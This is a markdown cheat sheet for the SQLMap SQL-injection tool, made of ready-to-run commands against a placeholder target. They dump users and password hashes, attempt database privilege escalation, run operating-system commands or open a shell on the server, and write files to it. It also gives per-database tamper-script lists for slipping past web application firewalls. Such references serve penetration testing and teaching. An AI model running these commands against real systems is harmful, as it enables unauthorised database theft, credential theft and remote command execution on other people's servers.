# SQLMap

Reference: https://github.com/wuvel/SQLMapCheatsheet/blob/master/README.md

## Command

- Target the http://target.server.com URL using the “-u” flag:

  ```
  sqlmap -u 'http://target.server.com'
  ```

- Specify POST requests by specifying the “–data” flag:

  ```
  sqlmap -u 'http://target.server.com' --data='param1=blah&param2=blah'
  ```

- Target a vulnerable parameter in an authenticated session by specifying cookies using the “–cookie” flag:

  ```
  sqlmap -u 'http://target.server.com' --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx'
  ```

- Drop all Set-Cookie requests from the target web server using the “–drop-set-cookie” flag:
  ```
  sqlmap -u 'http://target.server.com' -r req.txt --drop-set-cookie
  ```
- Perform in-depth and risky attacks using the “–level” and “–risk” flags:
  ```
  sqlmap -u 'http://target.server.com' --data='param1=blah' --level=5 --risk=3
  ```
- Specify which POST or GET parameter to target using the “-p” flag:
  ```
  sqlmap -u 'http://target.server.com' --data='param1=blah&param2=blah' -p param1
  ```
- Choose a random User-Agent request header using the “–random-agent” flag:
  ```
  sqlmap -u 'http://target.server.com' -r req.txt --random-agent
  ```
- Target a certain database service using the “–dbms” flag:
  ```
  sqlmap -u 'http://target.server.com' -r req.txt --dbms Oracle
  ```
- Read a request (stored via Burpsuite) target the user parameter (and no other parameters), run risky queries, and dump users and passwords:
  ```
  sqlmap -r ./req.txt -p user --level=1 --risk=3 --passwords
  ```
- Attempt privilege escalation on the target database
  ```
  sqlmap -r ./req.txt --level=1 --risk=3 --privesc
  ```
- Run the “whoami” command on the target server.
  ```
  sqlmap -r ./req.txt --level=1 --risk=3 --os-cmd=whoami
  ```
- Dump everything in the database, but wait one second in-between requests.
  ```
  sqlmap -r ./req.txt --level=1 --risk=3 --dump --delay=1
  ```
- Here are some useful options for your pillaging pleasure:
  ```
  -r req.txt Specify a request stored in a text file, great for saved requests from BurpSuite.
  –force-ssl Force SQLmap to use SSL or TLS for its requests.
  –level=1 only test against the specified parameter, ignore all others.
  –risk=3 Run all exploit attempts, even the dangerous ones (could damage database).
  –delay Set a delay in-between requests, great for throttled connections.
  –proxy Set to http://127.0.0.1:8080 to pipe requests through BurpSuite for inspection.
  –privesc Attempt to elevate the privileges of the database service account.
  –all Enumerate everything inside the target database.
  –hostname Print the target database’s hostname.
  –passwords Find and exfiltrate all users and their password hashes or digests.
  –dbs Enumerate all databases accessible via the target webserver.
  –comments Enumerate all found comments inside the database.
  –sql-shell Return a SQL prompt for interaction.
  –os-cmd Attempt to execute a system command.
  –os-shell Attempt to return a command prompt or terminal for interaction.
  –reg-read Read the specified Windows registry key value.
  –file-write Specify a local file to be written to the target server.
  –file-dest Specify the remote destination to write a file to.
  –technique Specify a letter or letters of BEUSTQ to control the exploit attempts:
      B: Boolean-based blind
      E: Error-based
      U: Union query-based
      S: Stacked queries
      T: Time-based blind
      Q: Inline queries
  ```

## Tamper

Resource: https://docs.google.com/spreadsheets/d/10nMVkPNi5VS2s4Ju40IrvvaTO-grO_BTT5gJBtEhrb0/edit?source=post_page-----91be42dfc893----------------------#gid=0

- **All scripts**

  ```
   --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
  ```

- **General scripts**

  ```
  --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
  ```

- **Microsoft access**

  ```
  --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
  ```

- **Microsoft SQL Server**

  ```
  --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
  ```

- **MySQL**

  ```
  --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
  ```

- **Oracle**

  ```
  --tamper=between,charencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,xforwardedfor
  ```

- **PostgreSQL**

  ```
  --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,xforwardedfor
  ```

- **SAP MaxDB**

  ```
  --tamper=ifnull2ifisnull,nonrecursivereplacement,randomcase,securesphere,space2comment,space2plus,unionalltounion,unmagicquotes,xforwardedfor
  ```

- **SQLite**
  ```
  --tamper=ifnull2ifisnull,multiplespaces,nonrecursivereplacement,randomcase,securesphere,space2comment,space2dash,space2plus,unionalltounion,unmagicquotes,xforwardedfor
  ```
